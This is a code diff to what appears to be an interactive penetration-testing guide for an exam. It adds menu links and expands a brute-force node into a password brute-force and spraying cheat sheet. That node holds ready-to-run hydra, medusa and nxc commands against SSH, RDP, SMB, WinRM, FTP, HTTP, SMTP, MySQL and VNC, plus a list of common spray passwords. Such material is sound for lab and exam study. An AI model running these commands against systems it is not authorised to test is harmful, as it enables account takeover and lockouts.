@@ -52,6 +52,7 @@ cd ~/results/$IP`,
       { label: "Windows privesc", next: "jump_windows" },
       { label: "Active Directory", next: "jump_ad" },
       { label: "Services & ports", next: "jump_services" },
+      { label: "HTTP password brute force", next: "http_brute" },
       { label: "Scan notes — document findings", next: "scan_notes" },
       { label: "Version # danger reference", next: "version_ref" },
       { label: "Pivoting & tunnels", next: "jump_pivot" },
@@ -183,6 +184,7 @@ searchsploit -x <path/to/exploit>`,
       { label: "Command injection", next: "cmd_injection" },
       { label: "WordPress", next: "wordpress" },
       { label: "Login page — brute / bypass", next: "login_page" },
+      { label: "HTTP password brute force", next: "http_brute" },
       { label: "Subdomain enumeration", next: "subdomain_enum" },
       { label: "Back to jump menu", next: "jump_menu" },
     ],
@@ -3144,6 +3146,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
     choices: [
       { label: "Got access", next: "file_upload" },
       { label: "SQLi bypass worked", next: "sqli_test" },
+      { label: "Brute force the login", next: "http_brute" },
       { label: "Need usernames first", next: "web_fuzz_deep" },
     ],
   },
@@ -4201,34 +4204,82 @@ showmount -e $IP`,
   // ==========================================
   bruteforce: {
     phase: "CREDS",
-    title: "Brute Force",
-    body: "Build a targeted wordlist from the site with CeWL before throwing rockyou at everything. Username + password combos, default creds, and seasonal passwords are all common.",
-    cmd: `# Build custom wordlist from target
-cewl http://$IP -d 3 -m 5 -w custom.txt
+    title: "Brute Force / Password Spray",
+    body: "Know the difference — brute force tries many passwords against one user, spray tries one password against many users. AD environments lock out after 3-5 attempts. Always spray, never brute, against AD. Build a targeted wordlist with CeWL before throwing rockyou.",
+    cmd: `# ── BUILD TARGETED WORDLIST FIRST ────────────────────
+cewl http://$ip -d 3 -m 5 -w custom.txt
+# Combine with rockyou top 1000 for best coverage:
+head -1000 /usr/share/wordlists/rockyou.txt >> custom.txt
 
-# Hydra — SSH
+# ── SSH ───────────────────────────────────────────────
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\
-  ssh://$IP -t 4 -o hydra_ssh.txt
+  ssh://$ip -t 4 -o scans/hydra_ssh.txt
+# Single user
+hydra -l root -P /usr/share/wordlists/rockyou.txt \\
+  ssh://$ip -t 4
 
-# Hydra — web form
-hydra -l admin -P rockyou.txt \\
-  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -V
+# ── RDP (3389) ────────────────────────────────────────
+# -t 4 and -W 3 required — RDP hates parallel connections
+hydra -L users.txt -p 'KnownPassword' rdp://$ip -t 4 -W 3
+hydra -l administrator -P /usr/share/wordlists/rockyou.txt \\
+  rdp://$ip -t 4 -W 3
+# "account not active for remote desktop" = valid creds, no RDP perms
+# → try those creds on SMB/WinRM before giving up
+# medusa as fallback if hydra RDP module errors:
+medusa -h $ip -u administrator -P rockyou.txt -M rdp -t 1
 
-# Hydra — SMB
-hydra -L users.txt -P rockyou.txt smb://$IP
+# ── SMB (445) ─────────────────────────────────────────
+hydra -L users.txt -P rockyou.txt smb://$ip
+# CME spray — safer for AD (one password at a time)
+nxc smb $ip -u users.txt -p 'Password123' --continue-on-success
+nxc smb $ip -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+# --no-bruteforce = spray mode (user1:pass1, user2:pass2 — not all combos)
 
-# Hydra — FTP
-hydra -L users.txt -P rockyou.txt ftp://$IP
+# ── WinRM (5985) ──────────────────────────────────────
+hydra -L users.txt -P rockyou.txt winrm://$ip -t 4
+nxc winrm $ip -u users.txt -p 'Password123' --continue-on-success
 
-# CME spray (check lockout policy first!)
-crackmapexec smb $IP -u users.txt -p passwords.txt \\
-  --continue-on-success`,
-    warn: "Check lockout policy before spraying AD. Getting accounts locked will end your exam.",
+# ── FTP (21) ──────────────────────────────────────────
+hydra -L users.txt -P rockyou.txt ftp://$ip -t 4
+hydra -l anonymous -P rockyou.txt ftp://$ip -t 4
+
+# ── HTTP Basic Auth (browser popup) ───────────────────
+hydra -l admin -P rockyou.txt $ip http-get / -t 4 -V
+# embed in URL for Burp once cracked: http://admin:pass@$ip/
+
+# ── HTTP POST Form ────────────────────────────────────
+hydra -l admin -P rockyou.txt $ip \\
+  http-post-form "/login:username=^USER^&password=^PASS^:Invalid" -t 4 -V
+
+# ── SMTP (25) ─────────────────────────────────────────
+hydra -L users.txt -P rockyou.txt smtp://$ip -t 4
+# User enum via VRFY first:
+smtp-user-enum -M VRFY -U users.txt -t $ip
+
+# ── MySQL (3306) ──────────────────────────────────────
+hydra -l root -P rockyou.txt mysql://$ip -t 4
+nxc mssql $ip -u sa -p rockyou.txt  # MSSQL
+
+# ── VNC (5900) ────────────────────────────────────────
+hydra -P rockyou.txt vnc://$ip -t 4
+# VNC has no username — password only
+
+# ── SPRAY WORDLIST — safe for AD ──────────────────────
+# One password per user, check lockout first
+# Common spray passwords:
+# Season+Year:  Spring2024!  Winter2025!
+# Company name: Company123!
+# Common:       Password1  Welcome1  P@ssw0rd
+net accounts /domain   # check lockout threshold on Windows
+nxc smb $ip -u user -p 'Password1' 2>/dev/null | grep -v FAILURE`,
+    warn: "Check lockout policy BEFORE spraying AD — 'net accounts /domain' or crackmapexec. Getting accounts locked will burn your exam. RDP hydra module is experimental — use -t 4 -W 3 always. 'Account not active for remote desktop' means the password IS correct — spray those creds on SMB and WinRM immediately.",
     choices: [
       { label: "Got credentials!", next: "creds_found" },
-      { label: "No luck — searchsploit service versions", next: "searchsploit_web" },
+      { label: "No luck — check service versions", next: "version_ref" },
+      { label: "AD environment — careful with lockout", next: "ad_spray" },
     ],
   },
+
 
   hashcrack: {
     phase: "CREDS",
